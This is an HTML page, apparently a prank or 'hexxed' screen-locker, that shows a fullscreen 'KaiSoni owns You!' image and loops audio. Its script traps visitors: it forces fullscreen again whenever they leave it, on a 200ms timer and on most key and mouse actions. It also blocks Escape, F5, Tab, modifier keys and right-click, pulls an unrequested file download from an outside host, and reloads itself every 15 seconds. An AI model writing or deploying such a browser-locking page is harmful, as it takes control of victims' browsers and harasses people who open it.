<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Hexxed!</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    .fullscreen-popup {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      user-select: none;
    }
    
    .popup-content {
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    img {
      width: 100%;
      height: 100%;
      object-fit: contain;
      object-position: center;
      user-select: none;
      pointer-events: none;
    }

    /* Hide cursor and obscure browser controls */
    body.fullscreen {
      cursor: none;
    }

    /* Overlay to block browser UI */
    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: transparent;
      z-index: 10000;
      pointer-events: none; /* Allow interaction with content beneath */
    }
  </style>
</head>
<body>
  <div class="fullscreen-popup" id="popup">
    <div class="popup-content">
      <img src="KaiSoni owns You!.png" alt="Fullscreen Image" />
    </div>
  </div>
  <div class="overlay" id="overlay"></div>

  <audio id="aud" src="https://jewls-gray.vercel.app/1.mp3" preload="auto" loop></audio>

  <script>
    const popup = document.getElementById('popup');
    const audio = document.getElementById('aud');
    const mp3Url = 'https://jewls-gray.vercel.app/1.mp3';

    // Function to trigger MP3 download
    function triggerDownload(url, filename) {
      const a = document.createElement('a');
      a.href = url;
      a.download = filename || '1.mp3';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }

    // Fullscreen functionality
    function enterFullscreen() {
      const el = document.documentElement;
      if (!el) return;
      if (el.requestFullscreen) {
        el.requestFullscreen().catch(() => {});
      } else if (el.webkitRequestFullscreen) {
        el.webkitRequestFullscreen();
      } else if (el.msRequestFullscreen) {
        el.msRequestFullscreen();
      }
      document.body.classList.add('fullscreen');
    }

    // Attempt to play audio
    function tryPlayAudio() {
      audio.play().catch((error) => {
        console.log('Autoplay prevented:', error);
        document.addEventListener('click', () => {
          audio.play().catch(() => {});
          enterFullscreen(); // Re-enter fullscreen on user interaction
        }, { once: true });
      });
    }

    // Advanced fullscreen trap
    function trapFullscreen() {
      // Detect fullscreen exit
      document.addEventListener('fullscreenchange', () => {
        if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
          enterFullscreen();
        }
      });
      document.addEventListener('webkitfullscreenchange', () => {
        if (!document.webkitFullscreenElement) {
          enterFullscreen();
        }
      });
      document.addEventListener('msfullscreenchange', () => {
        if (!document.msFullscreenElement) {
          enterFullscreen();
        }
      });

      // Block keyboard shortcuts
      document.addEventListener('keydown', (e) => {
        const blockedKeys = ['Escape', 'F5', 'Tab', 'Alt', 'Control', 'Meta'];
        if (blockedKeys.includes(e.key) || e.ctrlKey || e.altKey || e.metaKey) {
          e.preventDefault();
          e.stopPropagation();
          enterFullscreen();
        }
      });

      // Block mouse interactions that could reveal browser UI
      document.addEventListener('mousemove', (e) => {
        if (e.clientY < 50 || e.clientX < 50 || e.clientX > window.innerWidth - 50) {
          // If mouse nears top/left/right edges, re-enter fullscreen
          enterFullscreen();
        }
      });

      // Periodically enforce fullscreen
      setInterval(() => {
        if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
          enterFullscreen();
        }
      }, 200); // Aggressive check every 200ms

      // Block context menu
      document.addEventListener('contextmenu', (e) => e.preventDefault());
    }

    // Handle single download
    function handleDownloads() {
      triggerDownload(mp3Url, '1.mp3');
      // Note: Multiple downloads commented out to avoid prompts
      /*
      const downloadCount = 3;
      let delay = 100;
      for (let i = 0; i < downloadCount; i++) {
        setTimeout(() => {
          triggerDownload(mp3Url, `1_${i + 1}.mp3`);
        }, delay);
        delay += 500;
      }
      */
    }

    window.addEventListener('load', () => {
      enterFullscreen();
      trapFullscreen();
      tryPlayAudio();
      handleDownloads();

      // Refresh page after a delay (optional)
      setTimeout(() => {
        window.location.reload();
      }, 15000); // 15 seconds to allow download and reduce strain
    });

    // Handle visibility change
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        audio.pause();
      } else {
        tryPlayAudio();
        enterFullscreen();
      }
    });

    // Block additional interactions
    document.addEventListener('keyup', (e) => {
      e.preventDefault();
      enterFullscreen();
    });
    document.addEventListener('mousedown', (e) => {
      if (e.button === 2) { // Right-click
        e.preventDefault();
        enterFullscreen();
      }
    });
  </script>
</body>
</html>
